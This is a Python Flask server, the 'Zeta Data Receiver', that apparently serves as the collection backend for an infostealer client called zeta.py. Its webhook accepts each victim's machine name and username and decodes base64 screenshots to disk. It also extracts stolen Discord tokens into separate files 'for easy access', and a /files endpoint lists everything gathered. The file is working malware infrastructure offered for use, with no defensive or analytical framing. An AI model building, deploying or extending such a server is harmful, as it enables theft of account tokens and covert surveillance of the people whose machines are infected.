from flask import Flask, request, jsonify
import json
import base64
import os
from datetime import datetime
from pathlib import Path

app = Flask(__name__)

# Configuration
DATA_DIR = Path("received_data")
DATA_DIR.mkdir(exist_ok=True)

@app.route('/webhook', methods=['POST'])
def webhook_receiver():
    """
    Main endpoint that receives data from your Zeta client.
    This matches the RENDER_URL in your zeta.py client.
    """
    try:
        # Get the incoming data
        data = request.json
        
        if not data:
            return jsonify({"status": "error", "message": "No JSON data received"}), 400
        
        # Generate unique filename based on timestamp and machine ID
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        machine_id = data.get('machine', 'unknown').replace('\\', '_').replace('/', '_')
        filename = f"zeta_data_{machine_id}_{timestamp}.json"
        filepath = DATA_DIR / filename
        
        # Save the raw data
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)
        
        # Process and save screenshots if present
        if 'screenshot' in data and data['screenshot']:
            try:
                screenshot_data = base64.b64decode(data['screenshot'])
                screenshot_path = DATA_DIR / f"screenshot_{machine_id}_{timestamp}.png"
                with open(screenshot_path, 'wb') as f:
                    f.write(screenshot_data)
                print(f"[{timestamp}] Saved screenshot: {screenshot_path}")
            except Exception as e:
                print(f"[{timestamp}] Error saving screenshot: {e}")
        
        # Extract and save tokens separately for easy access
        if 'discord' in data and isinstance(data['discord'], list):
            tokens_file = DATA_DIR / f"discord_tokens_{machine_id}_{timestamp}.txt"
            with open(tokens_file, 'w') as f:
                for i, token_data in enumerate(data['discord']):
                    f.write(f"=== Token {i+1} ===\n")
                    try:
                        # Discord tokens are base64 encoded in the client
                        decoded = base64.b64decode(token_data).decode('utf-8', errors='ignore')
                        f.write(decoded[:500] + "...\n\n")
                    except:
                        f.write(f"Base64 Data: {token_data[:100]}...\n\n")
        
        print(f"[{timestamp}] Received data from {data.get('machine', 'unknown')} - User: {data.get('user', 'unknown')}")
        
        # Log what was received
        received_keys = list(data.keys())
        print(f"[{timestamp}] Data contains: {received_keys}")
        
        return jsonify({
            "status": "success", 
            "message": f"Data received from {data.get('machine', 'unknown')}",
            "received_keys": received_keys
        }), 200
        
    except Exception as e:
        error_msg = f"Error processing request: {str(e)}"
        print(f"[ERROR] {error_msg}")
        return jsonify({"status": "error", "message": error_msg}), 500

@app.route('/test', methods=['GET'])
def test_endpoint():
    """Test endpoint to verify the server is running."""
    return jsonify({
        "status": "online",
        "service": "Zeta Data Receiver",
        "timestamp": datetime.now().isoformat(),
        "endpoints": {
            "webhook": "POST /webhook",
            "test": "GET /test",
            "status": "GET /"
        }
    }), 200

@app.route('/', methods=['GET'])
def index():
    """Root endpoint showing server status."""
    return jsonify({
        "status": "running",
        "service": "Zeta Data Collection Server",
        "version": "1.0",
        "timestamp": datetime.now().isoformat(),
        "data_received": len(list(DATA_DIR.glob("*.json"))) if DATA_DIR.exists() else 0
    }), 200

@app.route('/files', methods=['GET'])
def list_files():
    """List all received data files (for debugging)."""
    if not DATA_DIR.exists():
        return jsonify({"files": [], "count": 0}), 200
    
    files = []
    for file in DATA_DIR.glob("*"):
        files.append({
            "name": file.name,
            "size": file.stat().st_size,
            "modified": datetime.fromtimestamp(file.stat().st_mtime).isoformat()
        })
    
    return jsonify({
        "files": files,
        "count": len(files)
    }), 200

if __name__ == '__main__':
    # Get port from environment variable (Render sets this)
    port = int(os.environ.get('PORT', 10000))
    
    print(f"Starting Zeta Data Receiver on port {port}")
    print(f"Webhook endpoint: http://localhost:{port}/webhook")
    print(f"Data will be saved to: {DATA_DIR.absolute()}")
    
    app.run(host='0.0.0.0', port=port)